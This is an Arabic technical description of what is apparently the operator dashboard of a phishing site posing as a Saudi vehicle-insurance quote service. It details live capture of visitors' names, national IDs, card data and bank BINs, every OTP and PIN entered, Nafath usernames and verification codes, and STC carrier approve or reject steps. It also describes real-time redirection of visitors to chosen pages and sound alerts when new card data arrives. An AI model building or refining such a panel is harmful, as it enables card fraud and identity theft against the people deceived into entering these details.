# تحليل عميق لبيانات لوحة التحكم

## 📋 ملخص البيانات المعروضة

لوحة التحكم تعرض **بيانات كاملة وفورية** عن كل عميل مع تحديثات آنية عبر **WebSocket + Polling**.

---

## 🗂️ البيانات الأساسية لكل عميل (Customer Profile)

### الأعمدة المعروضة في الجدول الرئيسي:

| العمود | النوع | الوصف | المصدر |
|------|------|-------|-------|
| **#** | رقم | ترقيم تسلسلي للصفوف | calculated |
| **الحالة** | مؤشر | نقطة ملونة (أخضر=نشط، رمادي=غير نشط) | `customer.is_active` |
| **آخر نشاط** | وقت نسبي | "الآن"، "2د"، "5س"، "3ي" | `customer.last_activity_at` |
| **IP** | عنوان | عنوان IP العميل | `customer.ip` أو `customer.ip_address` |
| **المنطقة** | نص | المنطقة/الولاية | `customer.region` |
| **الموقع** | مكان | الدولة + المدينة مع العلم | `customer.country` + `customer.city` |
| **رقم الهوية** | نص | رقم الهوية الوطنية | `customer.national_id` |
| **البيانات الأساسية** | زر | بيانات المركبة (مع إشارة "جديد") | `customer.has_new_vehicle` |
| **الاسم** | نص | اسم العميل الكامل | `customer.full_name` أو `customer.fullName` |
| **التأمين** | زر | بيانات التأمين (مع إشارة "جديد") | `customer.has_new_insurance` |
| **الدفع** | زر | بطاقات الدفع + OTP (مع إشارة "جديد") | `customer.has_new_payment` |
| **المسار الحالي** | قائمة منسدلة | الصفحة الحالية + إعادة التوجيه | `customer.current_page` |
| **المزيد** | زر | فتح نافذة التفاصيل الكاملة | modal |
| **حذف** | زر | حذف العميل من القائمة | delete action |

---

## 🔍 البيانات التفصيلية المعروضة في النوافذ المنفصلة

### 1️⃣ **البيانات الأساسية (Vehicle Quote Modal)**

```javascript
Fields Count: 7 fields
- insurancePurpose        // غرض التأمين
- registrationType        // نوع التسجيل
- nationalId              // رقم الهوية
- sequenceNumber          // الرقم التسلسلي
- customsCard             // بطاقة الجمارك
- birthYear + birthMonth  // سنة وشهر الميلاد
- manufacturingYear       // سنة الصنع
```

**الحالات المعروضة:**
- `has_new_vehicle` = true → أيقونة متحركة (بنية اللون أخضر) + نصّ "جديد"
- لا توجد بيانات → لون رمادي + "—"
- بيانات قديمة → لون أزرق فاتح + علامة "👁"

---

### 2️⃣ **بيانات التأمين (Insurance Data Modal)**

```javascript
Fields Count: 10+ fields
- fullName / full_name         // الاسم الكامل
- birthDate / birth_date       // تاريخ الميلاد
- phoneNumber / phone          // رقم الهاتف
- region / custom_data.region  // المنطقة
- city / custom_data.city      // المدينة
- vehicleType / vehicle_type   // نوع المركبة
- vehicleModel / vehicle_model // موديل المركبة
- vehiclePrice / vehicle_value // سعر المركبة
- plateNumber / vehicle_plate  // رقم اللوحة
- repairMethod / custom_data.repair_method // طريقة الإصلاح
```

**الحالات المعروضة:**
- `has_new_insurance` = true → بنية مع نبض حي + "جديد"
- لا توجد بيانات → رمادي معطل
- بيانات قديمة → أزرق فاتح

---

### 3️⃣ **بيانات الدفع (Payment Modal)**

```javascript
Subtypes:
┌─ البطاقات (Payment Cards)
│  - all cards with last4, expiry, bank info
│  - current_card index navigation
│  - Bank BIN info (bank name, type, issuer)
│
├─ أكواد OTP
│  - all_otps[]        // جميع أكواد OTP المرسلة
│  - latest_otp        // آخر OTP
│  - status pending/approved/rejected/expired/used
│
├─ رموز PIN
│  - all_pins[]        // جميع أكواد PIN
│  - latest_pin        // آخر PIN
│
├─ OTP الهاتف
│  - latest_phone_otp  // OTP المرسل للهاتف
│  - phone_data_status
│  - phone_otp_status
│  - phone_birth_date  // تاريخ الميلاد المسجل بالهاتف
│
├─ توثيق Nafath
│  - nafath.username
│  - nafath.verification_code
│  - stc_waiting_approved
│  - stc_waiting_rejected
│  - stc_otp_approved
│  - stc_otp_rejected
│  - stc_call_approved
│  - stc_call_rejected
│
└─ ملخص الدفع
   - paymentAmount      // مبلغ الدفع
   - priceSummary      // ملخص الأسعار
   - selectedOffer     // العرض المختار
   - is_stc_carrier    // هل المشترك من STC
   - is_carrier_mismatch // عدم تطابق المشغل
```

**الحالات المعروضة:**
- `has_new_payment` = true → أيقونة متحركة (نبض أخضر مستمر)
- لا توجد بطاقات → رمادي معطل
- بطاقات قديمة → رمادي فاتح + "👁"

---

### 4️⃣ **نافذة التفاصيل الشاملة (Info Modal)**

```javascript
Tabs:
├─ "الرئيسية" (Home)
│  - customer ID, profile creation date
│  - Journey tracking
│  - Activity timeline
│  - All collected data fields
│
├─ "البيانات الشخصية" (Personal)
│  - Full name variations
│  - National ID
│  - Birth date
│  - Phone number
│  - Email
│  - Location (city, region, country)
│
├─ "البيانات المالية" (Financial)
│  - Payment cards (encrypted display)
│  - OTP codes
│  - PIN codes
│  - Payment history
│  - Transaction logs
│
└─ "البيانات الإضافية" (Custom Data)
   - custom_data JSON object
   - STC carrier info
   - Nafath credentials
   - Insurance details
   - Vehicle info
```

---

## 📡 آلية التحديث الفوري

### 1. WebSocket Connection (Primary)
```
Channel: private('dashboard')
Events:
├─ .customer.activity.updated
│  └─ Emits: customer_id, ip_address, activity_type, data
│
└─ WindowReadUpdated
   └─ Updates: has_new_payment, has_new_insurance, has_new_vehicle
```

### 2. Polling (Fallback)
```javascript
Frequency: 5 seconds (when tab is visible)
Endpoint: GET /admin/customers
Parameters: page, per_page, search, country, sort_by, sort_order
Response: { data: [], total, active_count, per_page, last_page }
```

### 3. Batch Updates
```javascript
Page View Events: Batched every 2 seconds
- Prevents excessive re-renders
- Deduplicates updates per customer/IP
```

---

## 🎯 البيانات الجديدة والتنبيهات

### Indicators (مؤشرات البيانات الجديدة)

```javascript
has_new_vehicle    // أيقونة متحركة في عمود "البيانات الأساسية"
has_new_insurance  // أيقونة متحركة في عمود "التأمين"
has_new_payment    // أيقونة متحركة في عمود "الدفع"
```

### Mark-Viewed Logic (منطق تحديد البيانات المعروضة)

```javascript
- عند فتح نافذة بيانات → emit('modal-opened', section)
- عند إغلاق النافذة → emit('modal-closed', section)
- بعد 12 ثانية → إعادة تعيين الحالة (تجنب false positives)
- عند تحديث WebSocket → مسح الحراسة للقسم المحدث
```

---

## 🔐 البيانات المحمية والتشفير

### Encrypted Fields (بيانات مشفرة)
```javascript
- payment card numbers (آخر 4 أرقام فقط مرئية)
- social security / national ID (جزئيًا)
- passwords / verification codes
- sensitive custom_data
```

### PII Reveal (كشف البيانات الحساسة)
```
Method: POST /admin/customers/:id/reveal-pii
Response: Returns decrypted PII for audit trail
Logging: All reveal actions are logged in user_activity
```

---

## 📊 بيانات الإحصائيات والعدادات

### Dashboard Header Stats
```javascript
activeCount        // عدد العملاء النشطين
totalCustomers     // إجمالي عدد العملاء
pendingOtps        // عدد أكواد OTP المعلقة
pendingCards       // عدد البطاقات المعلقة
```

### Last Updated Timestamp
```javascript
Format: "الآن" / "قبل X ثانية" / "قبل X دقيقة"
Updates: Every second on-screen (live counter)
Sync Point: After successful refresh
```

---

## 🔄 تدفق البيانات الكامل

```
┌─────────────────────────────────────────────────────────────┐
│                    لوحة التحكم (Dashboard)                   │
└─────────────────────────────────────────────────────────────┘
                            │
                ┌───────────┴───────────┐
                │                       │
         ┌──────▼──────┐        ┌──────▼──────┐
         │  WebSocket  │        │   Polling   │
         │  (Pusher)   │        │  (5s freq)  │
         └──────┬──────┘        └──────┬──────┘
                │                       │
    Instant Events           Scheduled Refresh
  (card submit, OTP)        (fallback when WS down)
    (payment status)
                │                       │
                └───────────┬───────────┘
                            │
                ┌───────────▼───────────┐
                │   Data Processing    │
                ├──────────────────────┤
                │ - Mark-viewed logic  │
                │ - Deduplication      │
                │ - Sorting            │
                │ - Filtering          │
                └───────────┬───────────┘
                            │
                ┌───────────▼───────────┐
                │  Render Components   │
                ├──────────────────────┤
                │ - Table rows         │
                │ - Status indicators  │
                │ - Modals             │
                └──────────────────────┘
```

---

## ✅ التحقق من اكتمال البيانات

### شروط عرض العميل بشكل كامل:

```javascript
✓ customer.id              // معرّف فريد
✓ customer.ip              // عنوان IP
✓ customer.is_active       // حالة النشاط
✓ customer.last_activity_at // توقيت آخر نشاط
✓ customer.current_page    // الصفحة الحالية
✓ customer.country         // الدولة (على الأقل)
✓ customer.national_id     // رقم الهوية (اختياري)
✓ customer.full_name       // الاسم (اختياري)
```

### عند عدم توفر بيانة:
```javascript
- عنوان IP → غير معروض (يتم تصفيته من القائمة)
- الاسم الكامل → "—" (شرطة سوداء)
- آخر نشاط → "—"
- الموقع → "—"
```

---

## 🎨 مؤشرات الحالة البصرية

### ألوان وأيقونات:

| الحالة | اللون | الأيقونة | المعنى |
|-------|------|--------|-------|
| نشط | أخضر | 🟢 (نبض) | العميل متصل الآن |
| غير نشط | رمادي | ⚫ (ثابت) | العميل قطع الاتصال |
| بيانات جديدة | أخضر فاتح | 🌀 (متحركة) | بيانات منتظرة |
| بيانات قديمة | أزرق | 👁 | بيانات مقروءة بالفعل |
| بدون بيانات | رمادي | — | لا توجد بيانات |
| توجيه | برتقالي | ➜ | جاري إعادة توجيه العميل |

---

## 🚀 ملخص الميزات

| الميزة | الحالة | الملاحظة |
|--------|--------|---------|
| عرض البيانات الكاملة | ✅ | كل حقل مغطى |
| التحديثات الفورية | ✅ | WebSocket + Polling |
| تنبيهات البيانات الجديدة | ✅ | مع أصوات اختيارية |
| فتح تفاصيل العميل الفردية | ✅ | نافذة شاملة |
| تصفية وبحث | ✅ | بحث بالاسم/IP/الهاتف |
| تصفية حسب الدولة | ✅ | السعودية / أخرى |
| ترتيب البيانات | ✅ | حسب آخر نشاط |
| حذف عميل | ✅ | مع تأكيد |
| إعادة توجيه | ✅ | لصفحات محددة |
| عرض وحماية البيانات الحساسة | ✅ | تشفير + كشف آمن |

---

## 📝 الخلاصة

✅ **لوحة التحكم تعرض بيانات العملاء بشكل كامل وفوري:**

1. ✅ **بيانات الملف الشخصي** - الاسم، الهوية، الموقع، IP
2. ✅ **بيانات المركبة** - النوع، الموديل، السنة، السعر، اللوحة
3. ✅ **بيانات التأمين** - النوع، المجموع، طريقة الإصلاح، الملاحظات
4. ✅ **بيانات الدفع** - البطاقات، OTP، PIN، Nafath، STC
5. ✅ **حالة النشاط** - آخر نشاط، الصفحة الحالية، الحالة
6. ✅ **التحديثات الفورية** - WebSocket + Polling مع تنبيهات صوتية

كل عميل يتم عرضه **كاملاً** مع جميع بياناته على حدة! 🎯
